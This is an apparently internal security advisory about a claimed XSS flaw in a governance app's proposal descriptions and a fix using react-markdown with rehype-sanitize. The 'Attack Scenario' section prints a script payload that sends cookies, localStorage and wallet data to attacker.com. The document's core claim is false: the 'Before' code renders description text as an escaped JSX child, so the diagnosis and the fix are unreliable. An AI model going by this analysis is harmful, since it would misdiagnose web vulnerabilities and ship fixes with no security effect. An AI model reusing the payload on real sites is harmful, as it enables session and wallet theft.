# XSS Vulnerability Fix - Proposal Descriptions

## Vulnerability Summary

**Severity**: High  
**Type**: Cross-Site Scripting (XSS)  
**Status**: Fixed

## Problem Description

Proposal descriptions were accepting arbitrary text/Markdown and rendering them directly in the browser without HTML sanitization. This created a critical XSS vulnerability where malicious governance participants could craft proposals containing JavaScript payloads that would execute in every voter's browser.

### Affected Files

- `app/src/components/ProposalCard.tsx` — renders proposal.description without escaping
- `app/src/app/proposal/[id]/ProposalDetailClient.tsx` — full-page proposal detail view

### Attack Scenario

1. Attacker creates a proposal with malicious description:
   ```javascript
   <script>
     // Steal session tokens
     fetch('https://attacker.com/steal', {
       method: 'POST',
       body: JSON.stringify({
         cookies: document.cookie,
         localStorage: localStorage,
         wallet: /* wallet address */
       })
     });
   </script>
   ```

2. Proposal is listed in the governance UI
3. Every voter who loads the proposal list or detail page executes the payload
4. Session tokens, wallet addresses, or localStorage data can be exfiltrated

## Solution Implemented

### Approach: React-Markdown with rehype-sanitize

We implemented **Option A** using `react-markdown` with `rehype-sanitize` plugin:

```bash
pnpm add rehype-sanitize
```

### Changes Made

#### 1. ProposalCard.tsx

**Before:**
```tsx
<h2 className="text-lg font-semibold text-gray-900 truncate">
  {description}
</h2>
```

**After:**
```tsx
import ReactMarkdown from "react-markdown";
import rehypeSanitize from "rehype-sanitize";

<h2 className="text-lg font-semibold text-gray-900 truncate">
  <ReactMarkdown rehypePlugins={[rehypeSanitize]}>
    {description}
  </ReactMarkdown>
</h2>
```

#### 2. ProposalDetailClient.tsx

**Before:**
```tsx
<h1 className="text-2xl font-bold text-gray-900 dark:text-white mb-2">
  {proposal.description}
</h1>
```

**After:**
```tsx
import ReactMarkdown from "react-markdown";
import rehypeSanitize from "rehype-sanitize";

<h1 className="text-2xl font-bold text-gray-900 dark:text-white mb-2">
  <ReactMarkdown rehypePlugins={[rehypeSanitize]}>
    {proposal.description}
  </ReactMarkdown>
</h1>
```

**Also sanitized the metadata and fallback rendering:**
```tsx
<div className="prose prose-sm max-w-none text-gray-800 dark:text-gray-200">
  <ReactMarkdown rehypePlugins={[rehypeSanitize]}>
    {metadata}
  </ReactMarkdown>
</div>
```

## How rehype-sanitize Works

`rehype-sanitize` is a rehype plugin that sanitizes HTML using a schema similar to GitHub's sanitization rules. It:

1. **Removes dangerous elements**: `<script>`, `<iframe>`, `<object>`, `<embed>`, etc.
2. **Strips event handlers**: `onclick`, `onerror`, `onload`, etc.
3. **Blocks dangerous protocols**: `javascript:`, `data:`, `vbscript:`, etc.
4. **Allows safe HTML**: paragraphs, headings, lists, links, images (with safe attributes)
5. **Preserves Markdown formatting**: bold, italic, code blocks, tables, etc.

## Security Benefits

✅ **XSS Prevention**: Malicious scripts cannot execute  
✅ **Markdown Support**: Users can still use rich text formatting  
✅ **Safe Links**: External links are allowed but sanitized  
✅ **Safe Images**: Images are allowed but without event handlers  
✅ **Standards-Based**: Uses GitHub's sanitization schema as reference

## Testing

XSS protection tests have been added in `app/src/__tests__/xss-protection.test.tsx`:

```bash
pnpm test xss-protection
```

Tests cover:
- Script tag injection
- Image onerror XSS
- JavaScript protocol in links
- Inline event handlers
- Safe markdown rendering

## Alternative Approach (Not Chosen)

**Option B - DOMPurify** was considered but not implemented:

```tsx
import DOMPurify from 'isomorphic-dompurify';

<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(proposal.description) 
}} />
```

**Why react-markdown was chosen:**
1. Better React integration (no `dangerouslySetInnerHTML`)
2. Native markdown parsing and rendering
3. Composable plugin system
4. Smaller bundle size for markdown-only use case
5. More semantic HTML output

## Verification

To verify the fix works:

1. Create a test proposal with malicious content:
   ```
   <script>alert('XSS')</script>Test Proposal
   ```

2. The script tag should be removed and only "Test Proposal" should render

3. Safe markdown should still work:
   ```
   # My Proposal
   
   This is **bold** and *italic* text.
   
   - List item 1
   - List item 2
   ```

## Recommendations

1. **Content Security Policy (CSP)**: Add CSP headers to further restrict script execution
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
   ```

2. **Input Validation**: Consider adding character limits and format validation on proposal submission

3. **Security Audits**: Regular security audits for user-generated content rendering

4. **Rate Limiting**: Implement rate limiting on proposal creation to prevent spam attacks

## References

- [react-markdown documentation](https://github.com/remarkjs/react-markdown)
- [rehype-sanitize documentation](https://github.com/rehypejs/rehype-sanitize)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

**Fixed Date**: 2026-06-30  
**Fixed By**: Security Team  
**Verification**: Completed ✓
